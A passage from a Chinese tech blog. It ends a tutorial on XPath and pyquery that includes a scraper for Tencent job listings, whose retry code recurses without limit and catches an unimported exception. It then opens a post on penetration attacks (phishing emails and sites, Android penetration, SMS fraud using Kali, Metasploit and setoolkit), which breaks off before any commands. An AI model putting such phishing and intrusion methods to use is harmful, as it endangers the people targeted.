class="number">0x14d6a6e4e88</span>&gt;]</span><br><span class="line"></span><br><span class="line">[&lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4d88</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4dc8</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e48</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e88</span>&gt;]</span><br><span class="line"></span><br><span class="line">[&lt;Element head <span class="meta">at</span> <span class="number">0x14d6a6e4408</span>&gt;]</span><br></pre></td></tr></table></figure></p>
<ul>
<li><code>all_bj = bd_bj.xpath(&quot;//*&quot;)</code>，使用<code>//</code>可以选择当前节点<code>(html)</code>下的所有子孙节点，且以一个列表的形式来返回，列表元素通过<code>bd_bj</code>一样是<code>element</code>对象，下面的返回类型一致</li>
<li><code>img_bj = bd_bj.xpath(&quot;//img&quot;)</code>，选取当前节点下指定名称的节点，这里建议与Beautiful Soup的使用相比较可增强记忆，Beautiful Soup是通过<code>.find_all(&quot;img&quot;)</code>的形式</li>
<li><code>p_a_zj_bj = bd_bj.xpath(&quot;//p/a&quot;)</code>，选取当前节点下的所有<code>p</code>节点下的直接子<code>a</code>节点，这里需要注意的是<strong>”直接“</strong>，如果<code>a</code>不是<code>p</code>节点的直接子节点则选取失败</li>
<li><code>p_a_all_bj = bd_bj.xpath(&quot;//p//a&quot;)</code> ，选取当前节点下的所有<code>p</code>节点下的所有子孙<code>a</code>节点，这里需要注意的是<strong>”所有“</strong>，注意与上一个操作进行区分</li>
<li><code>head_bj = bd_bj.xpath(&quot;//title/..&quot;)</code>，选取当前节点下的<code>title</code>节点的父节点，即<code>head</code>节点</li>
</ul>
<h3 id="数据提取-1"><a href="#数据提取-1" class="headerlink" title="数据提取"></a>数据提取</h3><p>在了解如何选择指定的节点之后，我们就需要提取节点中所包含的数据了，具体提取请看下面的示例：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">img_href_ls</span> = bd_bj.xpath(<span class="string">"//img/@src"</span>)</span><br><span class="line"><span class="attr">img_href</span> = bd_bj.xpath(<span class="string">"//div[@id='lg']/img[@hidefocus='true']/@src"</span>)</span><br><span class="line"><span class="attr">a_content_ls</span> = bd_bj.xpath(<span class="string">"//a//text()"</span>)</span><br><span class="line"><span class="attr">a_news_content</span> = bd_bj.xpath(<span class="string">"//a[@class='mnav' and @name='tj_trnews']/text()"</span>)</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">'//www.baidu.com/img/bd_logo1.png</span>', <span class="symbol">'//www.baidu.com/img/gs.gif</span>']</span><br><span class="line"></span><br><span class="line">[<span class="symbol">'//www.baidu.com/img/bd_logo1.png</span>']</span><br><span class="line"></span><br><span class="line">[<span class="symbol">'新闻</span>', <span class="symbol">'hao123</span>', <span class="symbol">'地图</span>', <span class="symbol">'视频</span>', <span class="symbol">'贴吧</span>', <span class="symbol">'登录</span>', <span class="symbol">'更多产品</span>', <span class="symbol">'关于百度</span>', <span class="symbol">'About</span> Baidu', <span class="symbol">'使用百度前必读</span>', <span class="symbol">'意见反馈</span>']</span><br><span class="line"></span><br><span class="line">[<span class="symbol">'新闻</span>']</span><br></pre></td></tr></table></figure>
<ul>
<li><code>img_href_ls = bd_bj.xpath(&quot;//img/@src&quot;)</code>，该代码先选取了当前节点下的所有<code>img</code>节点，然后将所有<code>img</code>节点的<code>src</code>属性值选取出来，返回的是一个列表形式</li>
<li><code>img_href = bd_bj.xpath(&quot;//div[@id=&#39;lg&#39;]/img[@hidefocus=&#39;true&#39;]/@src&quot;)</code>，该代码首先选取了当前节点下所有<code>id</code>属性值为<code>lg</code>的<code>div</code>，然后继续选取<code>div</code>节点下的直接子<code>img</code>节点（<code>hidefoucus=true</code>），最后选取其中的<code>src</code>属性值</li>
<li><code>a_content_ls = bd_bj.xpath(&quot;//a//text()&quot;)</code>，选取当前节点所有的<code>a</code>节点的所遇文本内容</li>
<li><code>a_news_content = bd_bj.xpath(&quot;//a[@class=&#39;mnav&#39; and @name=&#39;tj_trnews&#39;]/text()&quot;)</code>，多属性选择，在xpath中可以指定满足多个属性的节点，只需要<code>and</code>即可</li>
</ul>
<font color="red">提醒：读者在阅读的过程中注意将代码和输出的结果仔细对应起来，只要理解其中的意思也就不难记忆了。</font>

<h3 id="XPath小结"><a href="#XPath小结" class="headerlink" title="XPath小结"></a>XPath小结</h3><p>耐心看完了XPath的使用方法之后，聪明的读者应该不难发现，其实Beautiful Soup和XPath的本质和思路上基本相同，只要我们在阅读XPath用法的同时在脑袋中不断的思考，相信聪明的你阅读至此已经能够基本掌握了XPath用法。</p>
<h2 id="pyquery"><a href="#pyquery" class="headerlink" title="pyquery"></a>pyquery</h2><p>对于pyquery，官方的解释如下：</p>
<blockquote>
<p>pyquery allows you to make jquery queries on xml documents. The API is as much as possible the similar to jquery. pyquery uses lxml for fast xml and html manipulation.<br>This is not (or at least not yet) a library to produce or interact with javascript code. I just liked the jquery API and I missed it in python so I told myself “Hey let’s make jquery in python”. This is the result.<br>It can be used for many purposes, one idea that I might try in the future is to use it for templating with pure http templates that you modify using pyquery. I can also be used for web scrapping or for theming applications with Deliverance.<br>The project is being actively developped on a git repository on Github. I have the policy of giving push access to anyone who wants it and then to review what he does. So if you want to contribute just email me.<br>Please report bugs on the github issue tracker.</p>
</blockquote>
<p>在网页解析过程中，除了强大的Beautiful Soup和XPath之外，还有qyquery的存在，qyquery同样受到了不少“蜘蛛”的欢迎，下面我们来介绍下qyquery的使用。</p>
<h3 id="节点选择-2"><a href="#节点选择-2" class="headerlink" title="节点选择"></a>节点选择</h3><p>与Beautiful Soup和XPath明显不同的是，在qyquery中，一般存在着三种解析方式，一种是<code>requests</code>请求链接之后把html进行传递，一种是将<code>url</code>直接进行传递，还有一种是直接传递本地<code>html</code>文件路径即可，读者在实际使用的过程中根据自己的习惯来编码即可，下面我们来看下这三种方式的表达：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line"></span><br><span class="line">bd_html = requests.get(<span class="string">"https://www.baidu.com"</span>).text</span><br><span class="line">bd_url = <span class="string">"https://www.baidu.com"</span></span><br><span class="line">bd_path = <span class="string">"./bd.html"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用html参数进行传递</span></span><br><span class="line">def way1(html):</span><br><span class="line">    <span class="keyword">return</span> p<span class="string">q(html)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 使用url参数进行传递</span></span><br><span class="line">def way2(url):</span><br><span class="line">    <span class="keyword">return</span> p<span class="string">q(url=url)</span></span><br><span class="line"></span><br><span class="line">def way3(path):</span><br><span class="line">    <span class="keyword">return</span> p<span class="string">q(filename=path)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(type(way1(html=bd_html)))</span><br><span class="line"><span class="keyword">print</span>(type(way2(url=bd_url)))</span><br><span class="line"><span class="keyword">print</span>(type(way3(path=bd_path)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class 'pyquery.pyquery.PyQuery'&gt;</span></span><br><span class="line"><span class="comment"># &lt;class 'pyquery.pyquery.PyQuery'&gt;</span></span><br><span class="line"><span class="comment"># &lt;class 'pyquery.pyquery.PyQuery'&gt;</span></span><br></pre></td></tr></table></figure>
<p>从上面三种获得解析对象方法的代码中我们可以明显看见都可以得到一样的解析对象，接下来我们只要利用这个对象来对页面进行解析从而提取出我们想要得到的有效信息即可，在qyquery中一般使用的是CSS选择器来选取。下面我们仍然使用百度首页来讲解pyquery的使用，在这里我们假设解析对象为<code>bd_bj</code>。</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">response.encoding = <span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line">bd_bj = pq(response.text)</span><br><span class="line"></span><br><span class="line">bd_title = bd_bj(<span class="string">"title"</span>)</span><br><span class="line">bd_img_ls = bd_bj(<span class="string">"img"</span>)</span><br><span class="line">bd_img_ls2 = bd_bj.find(<span class="string">"img"</span>)</span><br><span class="line">bd_mnav = bd_bj(<span class="string">".mnav"</span>)</span><br><span class="line">bd_img = bd_bj(<span class="string">"#u1 a"</span>)</span><br><span class="line">bd_a_video = bd_bj(<span class="string">"#u1 .mnav"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;title&gt;百度一下，你就知道&lt;/title&gt;</span></span><br><span class="line"><span class="comment"># &lt;img hidefocus="true" src="//www.baidu.com/img/bd_logo1.png" width="270" height="129"/&gt; &lt;img src="//www.baidu.com/img/gs.gif"/&gt; </span></span><br><span class="line"><span class="comment"># ......</span></span><br><span class="line"><span class="comment"># 输出结果较长，读者可自行运行</span></span><br></pre></td></tr></table></figure>
<p>正如上面代码所示，pyquery在进行节点提取的时候通常有三种方式，一种是直接提取出节点名即可提取出整个节点，当然这种方式你也可以使用<code>find</code>方法，这种提取节点的方式是不加任何属性限定的，所以提取出的节点往往会含有多个，所以我们可以使用循环<code>.items()</code>来进行操作；一种是提取出含有特定<code>class</code>属性的节点，这种形式采用的是<code>.+class属性值</code>；还有一种是提取含有特定<code>id</code>属性的节点，这种形式采用的是<code>#+id属性值</code>。熟悉<code>CSS</code>的读者应该不难理解以上提取节点的方法，正是在<code>CSS</code>中提取节点然后对其进行样式操作的方法。上述三种方式您也可以像提取<code>bd_a_video</code>一样混合使用</p>
<h3 id="数据提取-2"><a href="#数据提取-2" class="headerlink" title="数据提取"></a>数据提取</h3><p>在实际解析网页的过程中，三种解析方式基本上大同小异，为了读者认识<code>pyquery</code>的数据提取的操作以及博主日后的查阅，在这里简单的介绍下</p>
<figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">img_src1 = bd_bj(<span class="string">"img"</span>).attr(<span class="string">"src"</span>) <span class="comment"># //www.baidu.com/img/bd_logo1.png</span></span><br><span class="line">img_src2 = bd_bj(<span class="string">"img"</span>).attr.src    <span class="comment"># //www.baidu.com/img/bd_logo1.png</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">in</span> bd_bj.<span class="keyword">find</span>(<span class="string">"img"</span>).items():</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">each</span>.attr(<span class="string">"src"</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span>(bd_bj(<span class="string">"title"</span>).text())    <span class="comment"># 百度一下，你就知道</span></span><br></pre></td></tr></table></figure>
<p>如上一二行代码所示，提取节点属性我们可以有两种方式，这里拿<code>src</code>属性来进行说明，一种是<code>.attr(&quot;src&quot;)</code>，另外一种是<code>.attr.src</code>，读者根据自己的习惯来操作即可，这里需要注意的是：在节点提取小结中我们说了在不限制属性的情况下是提取出所有满足条件的节点，所以在这种情况下提取出的属性是第一个节点属性。要想提取所有的节点的属性，我们可以如四五行代码那样使用<code>.items()</code>然后进行遍历，最后和之前一样提取各个节点属性即可。<code>qyquery</code>提取节点中文本内容如第七行代码那样直接使用<code>.text()</code>即可。</p>
<h3 id="pyquery小结"><a href="#pyquery小结" class="headerlink" title="pyquery小结"></a>pyquery小结</h3><p>pyquery解析如Beautiful Soup和XPath思想一致，所以这了只是简单的介绍了下，想要进一步了解的读者可查阅官方文档在加之熟练操作即可。</p>
<h2 id="腾讯招聘网解析实战"><a href="#腾讯招聘网解析实战" class="headerlink" title="腾讯招聘网解析实战"></a>腾讯招聘网解析实战</h2><p>通过上述对Beautiful Soup、XPath以及pyquery的介绍，认真阅读过的读者想必已经有了一定的基础，下面我们通过一个简单的实战案例来强化一下三种解析方式的操作。此次解析的网站为腾讯招聘网，网址url：<a href="https://hr.tencent.com/" target="_blank" rel="noopener">https://hr.tencent.com/</a>，其社会招聘网首页如下所示：<br><img src="https://gss0.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/aa64034f78f0f7369adfccd70755b319eac413c6.jpg" width="500"></p>
<p>此次我们的任务就是分别利用上述三种解析工具来接下该网站下的社会招聘中的所有数据。</p>
<h3 id="网页分析："><a href="#网页分析：" class="headerlink" title="网页分析："></a>网页分析：</h3><p>通过该网站的社会招聘的首页，我们可以发现如下三条主要信息：</p>
<ul>
<li>首页url连接为<a href="https://hr.tencent.com/position.php" target="_blank" rel="noopener">https://hr.tencent.com/position.php</a></li>
<li>一共有288页的数据，每页10个职位，总职位共计2871</li>
<li>数据字段有五个，分别为：职位名称、职位类别、招聘人数、工作地点、职位发布时间</li>
</ul>
<p>既然我们解析的是该网站下所有职位数据，再者我们停留在第一页也没有发现其他有价值的信息，不如进入第二页看看，这时我们可以发现网站的url链接有了一个比较明显的变化，即原链接在用户端提交了一个<code>start</code>参数，此时链接为<a href="https://hr.tencent.com/position.php?&amp;start=10#a" target="_blank" rel="noopener">https://hr.tencent.com/position.php?&amp;start=10#a</a>，陆续打开后面的页面我们不难发现其规律：每一页提交的<code>start</code>参数以10位公差进行逐步递增。之后，我们使用谷歌开发者工具来审查该网页，我们可以发现全站皆为静态页面，这位我们解析省下了不少麻烦，我们需要的数据就静态的放置在<code>table</code>标签内，如下所示：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e850352ac65c1038f3b24f14bf119313b17e891c.jpg" width="500"></p>
<p>下面我们具体来分别使用以上三种工具来解析该站所有职位数据。</p>
<h3 id="案例源码"><a href="#案例源码" class="headerlink" title="案例源码"></a>案例源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TencentPosition</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	功能： 定义初始变量</span></span><br><span class="line"><span class="string">	参数：</span></span><br><span class="line"><span class="string">		start： 起始数据</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, start)</span>:</span></span><br><span class="line">		self.url = <span class="string">"https://hr.tencent.com/position.php?&amp;start=&#123;&#125;#a"</span>.format(start)</span><br><span class="line">		self.headers = &#123;</span><br><span class="line">			<span class="string">"Host"</span>: <span class="string">"hr.tencent.com"</span>,</span><br><span class="line">			<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">		self.file_path = <span class="string">"./TencentPosition.csv"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	功能： 请求目标页面</span></span><br><span class="line"><span class="string">	参数：</span></span><br><span class="line"><span class="string">		url： 目标链接</span></span><br><span class="line"><span class="string">		headers： 请求头</span></span><br><span class="line"><span class="string">	返回：</span></span><br><span class="line"><span class="string">		html，页面源码</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(self, url, headers)</span>:</span> </span><br><span class="line">		res = requests.get(url, headers=headers)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">				<span class="keyword">return</span> res.text</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> self.get_page(url, headers=headers)</span><br><span class="line">		<span class="keyword">except</span> RequestException <span class="keyword">as</span> e:</span><br><span class="line">			<span class="keyword">return</span> self.get_page(url, headers=headers)</span><br><span class="line">	</span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	功能： Beautiful Soup解析页面</span></span><br><span class="line"><span class="string">	参数：</span></span><br><span class="line"><span class="string">		html： 请求页面源码</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">soup_analysis</span><span class="params">(self, html)</span>:</span></span><br><span class="line">		soup = BeautifulSoup(html, <span class="string">"lxml"</span>)</span><br><span class="line">		tr_list = soup.find(<span class="string">"table"</span>, class_=<span class="string">"tablelist"</span>).find_all(<span class="string">"tr"</span>)</span><br><span class="line">		<span class="keyword">for</span> tr <span class="keyword">in</span> tr_list[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">			position_info = [td_data <span class="keyword">for</span> td_data <span class="keyword">in</span> tr.stripped_strings]</span><br><span class="line">			self.settle_data(position_info=position_info)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	功能： xpath解析页面</span></span><br><span class="line"><span class="string">	参数：</span></span><br><span class="line"><span class="string">		html： 请求页面源码</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">xpath_analysis</span><span class="params">(self, html)</span>:</span></span><br><span class="line">		result = etree.HTML(html)</span><br><span class="line">		tr_list = result.xpath(<span class="string">"//table[@class='tablelist']//tr"</span>)</span><br><span class="line">		<span class="keyword">for</span> tr <span class="keyword">in</span> tr_list[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">			position_info = tr.xpath(<span class="string">"./td//text()"</span>)</span><br><span class="line">			self.settle_data(position_info=position_info)</span><br><span class="line">	</span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	功能： pyquery解析页面</span></span><br><span class="line"><span class="string">	参数：</span></span><br><span class="line"><span class="string">		html： 请求页面源码</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">pyquery_analysis</span><span class="params">(self, html)</span>:</span></span><br><span class="line">		result = pq(html)</span><br><span class="line">		tr_list = result.find(<span class="string">".tablelist"</span>).find(<span class="string">"tr"</span>)</span><br><span class="line">		<span class="keyword">for</span> tr <span class="keyword">in</span> itertools.islice(tr_list.items(), <span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">			position_info = [td.text() <span class="keyword">for</span> td <span class="keyword">in</span> tr.find(<span class="string">"td"</span>).items()]</span><br><span class="line">			self.settle_data(position_info=position_info)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	功能： 职位数据整合</span></span><br><span class="line"><span class="string">	参数：</span></span><br><span class="line"><span class="string">		position_info： 字段数据列表</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">settle_data</span><span class="params">(self, position_info)</span>:</span></span><br><span class="line">		position_data = &#123;</span><br><span class="line">				<span class="string">"职位名称"</span>: position_info[<span class="number">0</span>].replace(<span class="string">"\xa0"</span>, <span class="string">" "</span>),	<span class="comment"># replace替换\xa0字符防止转码error</span></span><br><span class="line">				<span class="string">"职位类别"</span>: position_info[<span class="number">1</span>],</span><br><span class="line">				<span class="string">"招聘人数"</span>: position_info[<span class="number">2</span>],</span><br><span class="line">				<span class="string">"工作地点"</span>: position_info[<span class="number">3</span>],</span><br><span class="line">				<span class="string">"发布时间"</span>: position_info[<span class="number">-1</span>],</span><br><span class="line">			&#125;</span><br><span class="line">		print(position_data)</span><br><span class="line">		self.save_data(self.file_path, position_data)</span><br><span class="line"></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	功能： 数据保存</span></span><br><span class="line"><span class="string">	参数：</span></span><br><span class="line"><span class="string">		file_path： 文件保存路径</span></span><br><span class="line"><span class="string">		position_data： 职位数据</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">save_data</span><span class="params">(self, file_path, position_data)</span>:</span></span><br><span class="line">		df = pd.DataFrame([position_data])</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			df.to_csv(file_path, header=<span class="keyword">False</span>, index=<span class="keyword">False</span>, mode=<span class="string">"a+"</span>, encoding=<span class="string">"gbk"</span>)	<span class="comment"># 数据转码并换行存储</span></span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">			</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	<span class="keyword">for</span> page, index <span class="keyword">in</span> enumerate(range(<span class="number">287</span>)):</span><br><span class="line">		print(<span class="string">"正在爬取第&#123;&#125;页的职位数据:"</span>.format(page+<span class="number">1</span>))</span><br><span class="line">		tp = TencentPosition(start=(index*<span class="number">10</span>))</span><br><span class="line">		tp_html = tp.get_page(url=tp.url, headers=tp.headers)</span><br><span class="line">		tp.pyquery_analysis(html=tp_html)</span><br><span class="line">		print(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>
<p>部分结果如下：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/d4628535e5dde7115832c220aaefce1b9c166100.jpg" width="500"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在本篇文章中，首先我们分别介绍了Beautiful Soup、XPath、pyquery的常见操作，之后通过使用该三种解析工具来爬取腾讯招聘网中所有的职位招聘数据，从而进一步让读者有一个更加深刻的认识。该案例中，由于本篇文章重点在于网站页面的解析方法，所以未使用多线程、多进程，爬取所有的数据爬取的时间在两分钟左右，在之后的文章中有时间的话会再次介绍多线程多进程的使用，案例中的解析方式都已介绍过，所以读者阅读源码即可。</p>
<font color="red">注意：本文章中所有的内容皆为在实际开发中常见的一些操作，并非所有，想要进一步提升等级的读者务必请阅读官方文档。</font>

<div style="text-align: right">2019-01-01,By Zero</div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2018/12/14/渗透攻击/">渗透攻击</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-12-14
        </span><span class="post-category">
            <a href="/categories/白帽子/">白帽子</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经有两个多月没有记录了，最近一直在忙于复习408、线代，还有kaggle的学习，原本打算暂时不再更新文章的，但是最近收到不少了类似像教务处通知、竞赛确认、务必查收等社工邮件亦或短信，是在是可恶至极，所以就再来水一篇文章吧。之后Zero搜索下相关新闻咨询，发现类似诈骗案件的报道还真不少，一大叠一大叠的层出不穷，令人遗憾的是有不少用户抵抗不了自己的好奇心从而咬住了攻击者的“鱼钩”，故而给对方有了可乘之机。<br><img src="http://pjq6e477y.bkt.clouddn.com/1.png" width="600"></p>
<p>Zero最近同样收到了不少这种邮件，比如昨天下午收到的这封：<br><img src="http://pjq6e477y.bkt.clouddn.com/2.png" width="600"></p>
<p>虽然类似这种现象很是常见，但是万变不离其宗，攻击者主要是利用社会工程学 + 人们对事物的好奇心理来实行攻击。你的兴趣爱好、个人情感甚至是你的某一篇朋友圈等信息对于他们来说就富含了极大的价值，他们往往能够从中洞察一些别样的信息，也许这些不起眼的信息正是他成功攻击的关键。</p>
<p>所以说，在日常生活中，加强我们的网络安全意识是有必要的，不要天真的以为这些离你还很远，等到来临的那一刻恐怕就为时已晚了。在之前的文章中，已经介绍了无线wifi的入侵，可见：<a href="https://jacklxj.github.io/2018/12/14/WIFI%E7%A0%B4%E8%A7%A3/" target="_blank" rel="noopener">Wifi破解</a><br>本文主要介绍以下一些常见的攻击手段，希望能对读者有所帮助：</p>
<ul>
<li>社工邮件</li>
<li>钓鱼网站</li>
<li>安卓渗透</li>
<li>短信诈骗</li>
</ul>
<h2 id="免责申明"><a href="#免责申明" class="headerlink" title="免责申明"></a>免责申明</h2><font color="red">任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。（会坐牢的）</font>

<p><img src="http://ww2.sinaimg.cn/bmiddle/6af89bc8gw1f8nuikkysoj20k00k0abx.jpg"></p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>关于Kali Linux的下载安装，之前的文章已经有所介绍，这里就不再重述了。</p>
<ol>
<li>攻击机：Kali Linux</li>
<li>靶机：Windows 7，android</li>
<li>工具：Metasploit、setoolkit</li>
</ol>
<h2 id="社工邮件"><a href="#社工邮件" class="headerlink" title="社工邮件"></a>社工邮件</h2><p>在带有诈骗性的邮件中往往包含了钓鱼链接、木马文件之类的信息，主题中常常带有一些异奇描述，而这些描述则会带你落入圈套，博主不是很会描述，总之核心就是社会工程学。为了让大家理解其中的含义，下面拿诸葛建伟老师的<a href="https://baike.baidu.com/item/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/12350978?fr=aladdin" target="_blank" rel="noopener">《Metasploit渗透测试魔鬼训练营》</a>一书中的一个例子来说明下：<br><img src="http://pjq6e477y.bkt.clouddn.com/3.png" width="600"></p>
